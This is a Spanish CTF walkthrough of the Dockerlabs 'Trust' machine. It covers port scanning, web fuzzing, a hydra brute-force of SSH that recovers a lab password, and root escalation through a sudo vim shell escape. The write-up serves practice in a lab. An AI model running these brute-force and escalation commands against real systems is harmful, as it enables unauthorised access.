# Máquina Trust

Dificultad -> Muy fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con dos archivos un .sh y un .tar.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpetas.

Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
```shell
sudo bash auto_deploy.sh trust.tar
```


## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sv --min-rate 5000 -vvv -n -Pn 172.19.0.2 
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19a11a42fa3a9d9a0fea917f7edba3c7 (ECDSA)
|_  256 a6fdcf45a695052c5810738d39572bff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
***
```

Podemos ver que tenemos dos puertos abiertos que son el 22 (ssh) y el 80(http). El puerto 22 siempre puede ser importante para poder hacer fuerza bruta si sabemos un usuario y contraseña. Como el http está abierto, vamos a acceder a la IP en el buscador. Al acceder podemos ver que tiene una plantilla de Apache.

![Plantilla](/images/plantilla_apache.png)


## Fuzzing

Para poder obtener infroamción acerca de la página que tienen alojada en la IP, vamos usar fuzzing, que es una técnica que consiste en enviar datos aleatorios, inesperados o mal formados a un programa, servicio o aplicación para ver cómo responde. El objetivo principal es detectar errores, vulnerabilidades o fallos de seguridad.

Para ello vamos a utilizar distintas herrmaientas de fuzzing web para encontrar archivos o directorios web dentro de la página:

 ### Gobuster
 He probado distintas combiaciones en gobuster para ver si encontraba algo y he encontrado un php con el siguiente comando:
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]  
/server-status        (Status: 403) [Size: 275
 ```

Este comando utiliza una wordlist que le proporcionamos con el parámetro -w para probar posibles directorios y archivos en la web.
El parámetro -t indica el número de hilos concurrentes, acelerando el proceso de búsqueda.
La opción -x permite probar diferentes extensiones (por ejemplo, .php, .html) sobre cada palabra de la wordlist.

En conjunto, Gobuster intenta encontrar archivos o directorios en la URL o IP que le indicamos, que en este caso corresponde a la máquina objetivo donde está alojada la página web y la plantilla de Apache.

![Gobuster](/images/gobuster_1.png)

Al acceder a /secret.php podemos ver lo siguiente:

![PHP](/images/secret_php.png)

## Explotación
Solo tenemos un vector de ataque con la información que tenemos. Sabemos que está abierto el puerto 22 y que hay un usuario llamada Mario. Por tanto vamos a realizar fuerza bruta a este puerto utilizando **hydra**.
Tenemos que usar la wordlist rockyou que viene instalada ya en Kali. Suele venir instalado pero viene en un zip por lo que hay que descomprimirlo una vez. 
Localiza el archivo:
```bash
ls /usr/share/wordlists/rockyou.txt.gz
```

Debería estar en:
```swift
/usr/share/wordlists/rockyou.txt.gz
```

Descomprimimos el archivo  (solo lo tenemos que hacer una vez):
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

Ahora ya podemos usar la wordlist:
```swift
/usr/share/wordlists/rockyou.txt
```

Bien, ahora ya podemos usar hyndra para obtener ka contraseña del usuario Mario para realizar luego ssh
Usaremos el siguiene comando:
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 4
```


hydra → ejecuta la herramienta Hydra.

-l mario → indica el usuario único que queremos atacar, en este caso mario.

-P /usr/share/wordlists/rockyou.txt → indica la lista de contraseñas que Hydra va a probar para ese usuario.

Hydra probará cada contraseña del archivo rockyou.txt contra el usuario mario.

ssh://172.19.0.2 → especifica el servicio y la dirección del objetivo:

ssh → protocolo que se va a atacar.

172.19.0.2 → IP de la máquina donde Hydra intentará conectarse.

-t 4 → número de hilos concurrentes, es decir, Hydra hará 4 intentos al mismo tiempo para acelerar el proceso.


![Hydra1](/images/hydra1.png)

Obtenemos la contraseña, que como vemos es chocolate.

Ya podemos realizar ssh para entrar como Mario

```bash
ssh mario@172.19.0.2
```

### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

## Escalada de privilegios

Usamos **sudo -l** para ver si podemos ejecutar algo como root:

```shell
sudo -l
-----------------------
User mario may run the following commands on 78a58e094bf9:
    (ALL) /usr/bin/vim
```

Podemos ejecutar **vim**. Si no sabemos como explotarlo para escalar privilegios, siempre podemos consultar -> [GTFOBins](https://gtfobins.github.io/)

```shell
sudo vim -c ':!/bin/bash'
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema!


















